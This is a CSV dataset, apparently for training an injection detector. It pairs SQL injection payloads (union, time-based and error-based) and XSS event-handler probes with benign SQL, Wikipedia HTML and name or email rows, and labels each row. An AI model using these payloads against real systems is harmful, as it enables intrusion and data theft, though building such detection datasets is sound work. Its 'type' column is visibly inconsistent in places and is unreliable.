Text,Label,type
"<optgroup draggable=""true"" ondragenter=""alert(1)"">test</optgroup>",2,xss
<param onfocusout=alert(1) tabindex=1 id=x></param><input autofocus>,2,xss
1'   )    )    and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   'esal'  =  'esal,1,sql
"<image oncontextmenu=""alert(1)"">test</image>",2,xss
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",1,sql
<animatetransform onpointerout=alert(1)>XSS</animatetransform>,2,xss
"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""krxy""  =  ""krxy",1,sql
"<figure draggable=""true"" ondragstart=""alert(1)"">test</figure>",2,xss
SELECT * FROM dream WHERE value BETWEEN 'news' AND 'mud',0,xss
"<li><a href=""/wiki/Digital_organism"" title=""Digital organism"">Digital organism </a> </li>",0,xss
42808198t,0,sql
SELECT your FROM natural,0,sql
SELECT * FROM put WHERE storm = 'silver' LIMIT 3,0,sql
 or 'something' like 'some%',1,sql
"c/ jose belso castao, s/n,",0,sql
SELECT COUNT ( slept ) FROM visit,0,sql
1.02606E+15,0,sql
SELECT * FROM garden WHERE bear NOT LIKE '[hill]%',0,sql
1  )   where 4548  =  4548 and 9198  =  9198--,1,sql
SELECT AVG ( out ) FROM thee SELECT SUM ( fallen ) ,0,xss
SELECT * FROM west WHERE studied BETWEEN luck09/01/1996nodded AND little15/31/1996front,0,sql
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'yaje'  =  'yaje",1,sql
queral queral,0,sql
<tr onpointerenter=alert(1)>XSS</tr>,2,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Bloomberg.com&amp;rft.atitle=Musk-Backed+Group+Probes+Risks+Behind+Artificial+Intelligence&amp;rft.aulast=Clark&amp;rft.aufirst=Jack&amp;rft_id=https%3A%2F%2Fwww.bloomberg.com%2Fnews%2Farticles%2F2015-07-01%2Fmusk-backed-group-probes-risks-behind-artificial-intelligence&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT * FROM bound WHERE magnet = 'nearly' FETCH FIRST 3 ROWS ONLY,0,sql
"1'  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sql
"-6945' union all select 5063,5063,5063,5063,5063,5063,5063,5063--",1,sql
5.79858E+15,0,xss
"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,sql
	 </span>,0,xss
"<sup onclick=""alert(1)"">test</sup>",2,xss
5.11823E+15,0,sql
"1,  (  select * from generate_series  (  9108,9108,case when   (  9108  =  2900  )   then 1 else 0 end  )   limit 1  )  ",1,sql
"<li><cite id=""CITEREFLenatGuha1989"" class=""citation book""><a href=""/wiki/Douglas_Lenat"" title=""Douglas Lenat"">Lenat, Douglas </a>; Guha, R. V. (1989). <i>Building Large Knowledge-Based Systems </i>. Addison-Wesley. <a href=""/wiki/International_Standard_Book_Number"" title=""International Standard Book Number"">ISBN </a>&#160;<a href=""/wiki/Special:BookSources/978-0-201-51752-1"" title=""Special:BookSources/978-0-201-51752-1""><bdi>978-0-201-51752-1 </bdi> </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=book&amp;rft.btitle=Building+Large+Knowledge-Based+Systems&amp;rft.pub=Addison-Wesley&amp;rft.date=1989&amp;rft.isbn=978-0-201-51752-1&amp;rft.aulast=Lenat&amp;rft.aufirst=Douglas&amp;rft.au=Guha%2C+R.+V.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT TOP 3 * FROM believed,0,sql
" select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",1,sql
"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,xss
"   SELECT grabbed,ten,clay,almost,one     (  (  cake JOIN cattle ON steep.worried =  not.seeing )   INNER JOIN stormON Orders.did =  film.wrappedID ) ",0,sql
-1886' where 5518  =  5518 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,sql
cretas,0,sql
end and   (  'rlux' like 'rlux,1,xss
"<strong draggable=""true"" ondragstart=""alert(1)"">test</strong>",2,xss
1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,1,xss
"<li><a href=""/wiki/Resistive_random-access_memory"" title=""Resistive random-access memory"">RRAM </a> </li>",0,xss
"<p>This includes <a href=""/wiki/Embodied_agent"" title=""Embodied agent"">embodied </a>, <a href=""/wiki/Situated"" title=""Situated"">situated </a>, <a href=""/wiki/Behavior-based_AI"" class=""mw-redirect"" title=""Behavior-based AI"">behavior-based </a>, and <a href=""/wiki/Nouvelle_AI"" title=""Nouvelle AI"">nouvelle AI </a>. Researchers from the related field of <a href=""/wiki/Robotics"" title=""Robotics"">robotics </a>, such as <a href=""/wiki/Rodney_Brooks"" title=""Rodney Brooks"">Rodney Brooks </a>, rejected symbolic AI and focused on the basic engineering problems that would allow robots to move and survive.<sup id=""cite_ref-Embodied_AI_167-0"" class=""reference""><a href=""#cite_note-Embodied_AI-167"">&#91;164&#93; </a> </sup> Their work revived the non-symbolic point of view of the early <a href=""/wiki/Cybernetic"" class=""mw-redirect"" title=""Cybernetic"">cybernetics </a> researchers of the 1950s and reintroduced the use of <a href=""/wiki/Control_theory"" title=""Control theory"">control theory </a> in AI. This coincided with the development of the <a href=""/wiki/Embodied_mind_thesis"" class=""mw-redirect"" title=""Embodied mind thesis"">embodied mind thesis </a> in the related field of <a href=""/wiki/Cognitive_science"" title=""Cognitive science"">cognitive science </a>: the idea that aspects of the body (such as movement, perception and visualization) are required for higher intelligence.",0,xss
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><article id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></article>",2,xss
nancy,0,sql
"  SELECT quick,equator,child FROM press LEFT JOIN Orders ON increase.suggestID =  master.village ORDER BY route.tent",0,sql
persaud,0,sql
"1""  )   as ypfa where 6128  =  6128",1,sql
"1%'   )    )     )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,sql
"<IMG LOWSRC=""javascript:alert('')"">",2,xss
"<style>:target {color:red;}</style><option id=x style=""transition:color 1s"" ontransitionend=alert(1)></option>",2,xss
" select * from users where id  =  1 or ""._"" or 1  =  1 -- 1",1,sql
"<textarea onmouseleave=""alert(1)"">test</textarea>",2,xss
"  UPDATE operation SET bat =  'below', City =  'ice' WHERE president =  fell",0,sql
imokoude@transportesvegasl.et,0,sql
"<wbr oncopy=""alert(1)"" contenteditable>test</wbr>",2,xss
SELECT * FROM stepped WHERE mud BETWEEN '1996-07-01' AND '1996-07-31',0,sql
45183,0,xss
"1'+  (  select fhbk where 2570  =  2570 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1,sql
1'  )   as nexa where 6740  =  6740,1,sql
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
"1%'   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
-3677'   )    )    or 1939  =  4484,1,xss
"-3361 where 1335  =  1335 or elt  (  5891  =  5092,5092  )  --",1,sql
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, pp.&#160;345–395, </li>",0,xss
SELECT anywhere ( s )  FROM fighting SELECT string FROM political,0,sql
SELECT COUNT ( fish ) FROM wonderful,0,sql
"<summary draggable=""true"" ondrag=""alert(1)"">test</summary>",2,xss
SELECT DISTINCT activity FROM tax,0,sql
"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cssb'  =  'cssb",1,sql
28737,0,sql
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;127–133 </li> </ul>",0,xss
<area onblur=alert(1) tabindex=1 id=x></area><input autofocus>,2,xss
"-1956""  )   where 1448  =  1448 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1,sql
"<article draggable=""true"" ondragleave=""alert(1)"">test</article>",2,xss
"<li><a href=""/wiki/Machine_translation"" title=""Machine translation"">Machine translation </a> </li>",0,xss
        <dt>On Read the Docs</dt>,0,xss
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, pp.&#160;385–542, </li>",0,xss
SELECT * FROM surrounded WHERE send = 'brush' FETCH FIRST 3 ROWS ONLY,0,sql
heintje0@alpesfranceses.com.ro,0,sql
SELECT * FROM born FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
acabadamente,0,sql
"   SELECT COUNT ( exactly ) , near FROM immediately BY road",0,xss
SELECT column_name ( s ) FROM table1INNER JOIN,0,xss
1'||  (  select 'dajl' from dual where 8440  =  8440,1,sql
8.77345E+15,0,xss
"<s onmousedown=""alert(1)"">test</s>",2,xss
SELECT * FROM traffic  WHERE deal NOT LIKE '[over]%',0,sql
svenn-er,0,sql
	 </span></a>.</li>,0,xss
 </li>,0,xss
SELECT * FROM Customers ORDER BY CustomerName ASC;,0,sql
verdusco,0,sql
<svg><footer onload=alert(1)></footer>,2,xss
7608,0,sql
"<script onmouseout=""alert(1)"">test</script>",2,xss
"  UPDATE laid SET fuel =  'birds', City =  'won' WHERE carbon =  percent",0,sql
"1   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   6010  =  6010",1,xss
5n37do,0,sql
"<style>@keyframes x{}</style><hr style=""animation-name:x"" onanimationstart=""alert(1)""></hr>",2,xss
"	 </span> <span class=""toctext"">Probabilistic methods for uncertain reasoning ",0,xss
"<li><a href=""/wiki/Interactive_evolutionary_computation"" title=""Interactive evolutionary computation"">Interactive evolutionary computation </a> </li>",0,xss
" select * from users where id  =  1 or 1#""; union select version  (    )  ,version  (    )   -- 1",1,sql
SELECT * FROM bite WHERE dish NOT LIKE '[policeman]%',0,sql
sabanaya4,0,sql
"<style>:target {color:red;}</style><td id=x style=""transition:color 1s"" ontransitionend=alert(1)></td>",2,xss
judas,0,sql
0ntrecerrar,0,sql
tewksbur,0,xss
" select * from users where id  =  '1' or \<\ union select 1,@@VERSION -- 1'",1,sql
"	 </span> <span class=""reference-text"">",0,xss
katsuno@novolardiseno.br,0,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Science&amp;rft.atitle=What+can+machine+learning+do%3F+Workforce+implications&amp;rft.pages=1530-1534&amp;rft.date=2017-12-22&amp;rft_id=info%3Adoi%2F10.1126%2Fscience.aap8062&amp;rft_id=info%3Abibcode%2F2017Sci...358.1530B&amp;rft.aulast=Brynjolfsson&amp;rft.aufirst=Erik&amp;rft.au=Mitchell%2C+Tom&amp;rft_id=http%3A%2F%2Fscience.sciencemag.org%2Fcontent%2F358%2F6370%2F1530&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
scavran@eonon.com.at,0,sql
"  SELECT composition,compare FROM wonder WHERE stepped = 'about' UNION SELECT memory, receive FROM actually",0,xss
SELECT * FROM  ( SELECT tight FROM leader ) ,0,xss
"<li><a href=""/wiki/Multimedia_database"" title=""Multimedia database"">Multimedia information system </a> </li>",0,xss
-9534%' or 3038  =  3038,1,sql
25471,0,sql
"1%""  )   union all select null,null,null,null,null,null,null,null,null--",1,sql
"1,  (  select   (  case when   (  7711  =  7711  )   then 1 else 7711*  (  select 7711 from information_schema.character_sets  )   end   )    )   ",1,xss
SELECT * FROM glass  WHERE sat = blanket,0,sql
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",1,sql
"1   )    )    and make_set  (  8554  =  3286,3286  )   and    (    (   7385  =  7385",1,sql
SELECT * FROM card WHERE eat NOT BETWEEN 'happily' AND 'check',0,sql
"<code onbeforecut=""alert(1)"" contenteditable>test</code>",2,xss
SELECT care ( s FROM charge RIGHT JOIN,0,sql
1  )   or pg_sleep  (  __TIME__  )  --,1,sql
"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri",1,sql
"1'   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,xss
SELECT * FROM child WHERE today = 'depth' LIMIT 3,0,sql
SELECT * FROM nearly WHERE hang = 'paper'  OR term = 'golden',0,xss
"  UPDATE him SET belt =  'pleasant', City =  'particular' WHERE account =  above",0,sql
<svg><marquee onload=alert(1)></marquee>,2,xss
SELECT * FROM future FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""http://thebulletin.org/artificial-intelligence-really-existential-threat-humanity8577"">""Is artificial intelligence really an existential threat to humanity?"" </a>. <i>Bulletin of the Atomic Scientists </i>. 9 August 2015. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20151030054330/http://thebulletin.org/artificial-intelligence-really-existential-threat-humanity8577"">Archived </a> from the original on 30 October 2015<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">30 October ",0,xss
"	 </span><span class=""mw-editsection""><span class=""mw-editsection-bracket"">[ ",0,xss
SELECT * FROM breeze FETCH FIRST 3 ROWS ONLY,0,sql
9665,0,sql
13440,0,xss
SELECT * FROM roll WHERE outline BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"<center draggable=""true"" ondragleave=""alert(1)"">test</center>",2,xss
"-6746""  )   or   (  8459  =  8459  )  *4906 and   (  ""kohi"" like ""kohi",1,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
"<li><a href=""/wiki/Epicureanism"" title=""Epicureanism"">Epicureans </a> </li> </ul>",0,xss
FROM  ( SELECT DISTINCT girl FROM discuss ) ,0,sql
1 uni/**/on select all from where,1,sql
"1"" union all select null,null,null,null,null,null,null,null#",1,sql
SELECT AVG ( army ) FROM build SELECT SUM ( running ) ,0,sql
roger,0,sql
-2733'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'btjx'  =  'btjx,1,sql
	 </span> </a> </li>,0,xss
<applet onreadystatechange=alert(1)></applet>,2,xss
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  ""%""  =  """,1,sql
or '1'  =  '1,1,xss
<span id=x tabindex=1 ondeactivate=alert(1)></span><input id=y autofocus>,2,xss
"  UPDATE which SET tower =  'gone', City =  'record' WHERE gate =  hospital",0,sql
"<form onmouseup=""alert(1)"">test</form>",2,xss
"<li><a href=""/wiki/Ren%C3%A9_Descartes"" title=""René Descartes"">René Descartes </a> </li>",0,xss
"<li id=""cite_note-FOOTNOTEMcCorduck2004480–483-44""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-FOOTNOTEMcCorduck2004480–483_44-0"">^ </a> </b> ",0,xss
"   SELECT zulu, wise, poor FROM poor WHERE with  IS NULL",0,sql
eccles@aspirantes.gh,0,sql
FROM  ( SELECT DISTINCT owner FROM ball ) ,0,sql
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'pqxe' like 'pqxe",1,sql
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_bottom_content' LIMIT 1,0,xss
SELECT * FROM bit WHERE voice = 'golden' FETCH FIRST 3 ROWS ONLY,0,sql
calle laguna de pealara 171 12-e,0,xss
SELECT * FROM variety  WHERE law = cross,0,xss
DELETE FROM rhyme,0,sql
swearing,0,sql
mayworth@sms24h.tr,0,sql
SELECT difficulty ( s )  FROM strength LEFT JOIN,0,sql
"  SELECT gave AS add, welcome AS [river]  FROM officer",0,sql
-9501'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'mndw'  =  'mndw,1,sql
"1   )    )    as fmpr where 3103  =  3103 and elt  (  9970  =  9297,9297  )  --",1,sql
SELECT AVG ( last ) FROM tonight SELECT SUM ( make ) ,0,sql
SELECT AVG ( pale ) FROM suppose SELECT SUM ( drive ) ,0,sql
SELECT * FROM white  WHERE constantly = wave,0,xss
"  SELECT call,fear FROM gate WHERE get = 'cutting' UNION SELECT terrible, keep FROM underline",0,xss
encad7622i6,0,sql
select case when 2599  =  7035 then 1 else null end--,1,sql
"-9183""  )   as wctu where 2058  =  2058 or 3038  =  3038",1,sql
 </li>,0,xss
1 waitfor delay '0:0:5'-- nnnp,1,sql
1'||  (  select 'lvso' where 5675  =  5675,1,sql
"1""  )   where 2702  =  2702 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,sql
33971,0,sql
33001,0,sql
<rt onpointerleave=alert(1)>XSS</rt>,2,xss
"<select draggable=""true"" ondrag=""alert(1)"">test</select>",2,xss
98918059g,0,sql
saint-simon-vondis@paremoselalzheimer.dj,0,sql
"<mark onkeypress=""alert(1)"" contenteditable>test</mark>",2,xss
wardle,0,xss
10380,0,sql
"<hgroup onmousedown=""alert(1)"">test</hgroup>",2,xss
knyht9@aspirantes.lt,0,xss
 ,0,xss
"<style>:target {color: red;}</style><abbr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></abbr>",2,xss
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and '%'  =  '",1,sql
SELECT TOP 3 * FROM aloud SELECT * FROM invented 3SELECT * FROM visitor,0,sql
"<footer onkeyup=""alert(1)"" contenteditable>test</footer>",2,xss
georges,0,xss
"1 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",1,sql
"<li><a href=""/wiki/Software_framework"" title=""Software framework"">Software framework </a> </li>",0,xss
SELECT * FROM hold 3 SELECT * FROM statement,0,sql
SELECT * FROM whale WHERE lamp = 'met'  AND City = 'wooden',0,sql
"<tt oncopy=""alert(1)"" contenteditable>test</tt>",2,xss
"  SELECT   IF ( 500<1000, ""YES"", ""NO"" ) ;",0,sql
"1%""",1,sql
69320452q,0,xss
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",1,sql
pueblica de valverde,0,sql
"<li id=""cite_note-Natural_language_processing-120""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Natural_language_processing_120-0"">^ </a> </b> ",0,xss
<dl onpointerup=alert(1)>XSS</dl>,2,xss
<isindex id=x tabindex=1 onfocus=alert(1)></isindex>,2,xss
"1 where 8074  =  8074 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,xss
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'lqql'  =  'lqql",1,xss
"1""   )    )    as yuqr where 7226  =  7226 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,sql
"  SELECT nutsID AS ID, scientist AS orbit FROM quick",0,sql
"-9007  )   as gill where 6462  =  6462 union all select 6462,6462,6462,6462,6462,6462,6462,6462,6462#",1,sql
-4644 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  # upwd,1,sql
end and   (  4610  =  4610,1,sql
SELECT AVG ( crack ) FROM lost SELECT SUM ( paper ) ,0,sql
1%'   )    )     )   order by 1#,1,sql
SELECT TOP 50 PERCENT * FROM bone,0,sql
SELECT AVG ( salt ) FROM personal SELECT SUM ( hit ) ,0,sql
SELECT fell FROM single UNION ALL SELECT crew FROM stomach ORDER BY aboard,0,sql
"1""   )    )    and   (  3020  =  3020  )  *6703 and    (    (   ""bely""  =  ""bely",1,sql
"<li><a href=""/wiki/Sociology_of_scientific_knowledge"" title=""Sociology of scientific knowledge"">Sociology of scientific knowledge </a> </li>",0,xss
<iframe id=x tabindex=1 ondeactivate=alert(1)></iframe><input id=y autofocus>,2,xss
"<b onkeyup=""alert(1)"" contenteditable>test</b>",2,xss
<iframe id=x tabindex=1 onactivate=alert(1)></iframe>,2,xss
"<li id=""cite_note-AI_in_England-39""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-AI_in_England_39-0"">^ </a> </b> ",0,xss
"1""   )    )    as nwnp where 6140  =  6140",1,sql
"1%"" union all select null,null,null,null,null,null--",1,sql
SELECT * FROM fighting  WHERE heart = chicken,0,xss
"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdj'  =  'ibdj",1,sql
"<li id=""cite_note-Classical_planning-112""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Classical_planning_112-0"">^ </a> </b> ",0,xss
"<acronym onbeforecut=""alert(1)"" contenteditable>test</acronym>",2,xss
 </li>,0,xss
47965007w,0,sql
cervera de la caada,0,sql
	 </span>(2016) </li> </ul>,0,xss
"<noframes onmouseup=""alert(1)"">test</noframes>",2,xss
SELECT * FROM baseball ORDER BY giving DESC,0,sql
"<style>:target {transform: rotate(180deg);}</style><meter id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></meter>",2,xss
"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",1,sql
"<style>@keyframes x{}</style><nobr style=""animation-name:x"" onanimationend=""alert(1)""></nobr>",2,xss
"<style>:target {transform: rotate(180deg);}</style><hr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></hr>",2,xss
"1%'   )    )    union all select null,null,null,null,null#",1,sql
"<map onkeyup=""alert(1)"" contenteditable>test</map>",2,xss
SELECT * FROM general WHERE minute LIKE '%stairs%',0,sql
</script>,0,xss
DELETE FROM colony,0,sql
venialbo,0,sql
"calle bir ganduz, 90",0,sql
steele,0,sql
1%'   )    )    and 7160  =  7249--,1,xss
SELECT LCASE ( CustomerName )  AS LowercaseCustomerName FROM Customers;,0,sql
SELECT * FROM troops WHERE equal NOT LIKE '[bright]%',0,sql
"<pre oncut=""alert(1)"" contenteditable>test</pre>",2,xss
"<var onpaste=""alert(1)"" contenteditable>test</var>",2,xss
"<optgroup onmouseover=""alert(1)"">test</optgroup>",2,xss
SELECT * FROM seat WHERE fill NOT BETWEEN 'sound' AND 'winter',0,sql
completorio,0,sql
"<li><a href=""/wiki/Social_computing"" title=""Social computing"">Social computing </a> </li>",0,xss
7164,0,sql
"<caption onmousemove=""alert(1)"">test</caption>",2,xss
" </p><p>In <a href=""/wiki/Electronic_discovery"" title=""Electronic discovery"">Electronic Discovery (eDiscovery) </a>, the industry has been focused on machine learning (predictive coding/technology assisted review), which is a subset of AI. To add to the soup of applications, Natural Language Processing (NLP) and Automated Speech Recognition (ASR) are also in vogue in the industry.<sup id=""cite_ref-328"" class=""reference""><a href=""#cite_note-328"">&#91;317&#93; </a> </sup>",0,xss
SELECT large,0,sql
SELECT TOP 50 PERCENT * FROM shut SELECT * FROM general FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM three,0,sql
SELECT COUNT ( essential ) FROM jack,0,sql
SELECT AVG ( extra ) FROM plant SELECT SUM ( possible ) ,0,sql
"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>",2,xss
SELECT * FROM constantly,0,sql
SELECT * FROM sure WHERE mass = 'unknown'  OR leaving = 'worse',0,sql
1 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- icxn,1,sql
"1""  )   as ranl where 5553  =  5553",1,sql
dotan,0,sql
"   SELECT red, rhythm, cookFROM from WHERE mine  IS NOT NULL",0,sql
SELECT * FROM  ( SELECT sheet FROM southern ) ,0,sql
1'||  (  select 'byxb' where 8351  =  8351 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ||',1,sql
SELECT * FROM three WHERE graph = 'safety' LIMIT 3,0,sql
SELECT AVG ( grabbed )  FROM warn  SELECT SUM ( smell ) ,0,sql
" SELECT * FROM express ORDER BY independent ASC, love DESC",0,sql
tehchi8,0,xss
50236,0,xss
"1%""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,xss
6e0turer2,0,sql
"1' and make_set  (  8403  =  8403,8899  )  ",1,xss
"<h1 onkeypress=""alert(1)"" contenteditable>test</h1>",2,xss
"  SELECT truckID AS ID, article AS death FROM live",0,sql
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  7079  =  7079,1,sql
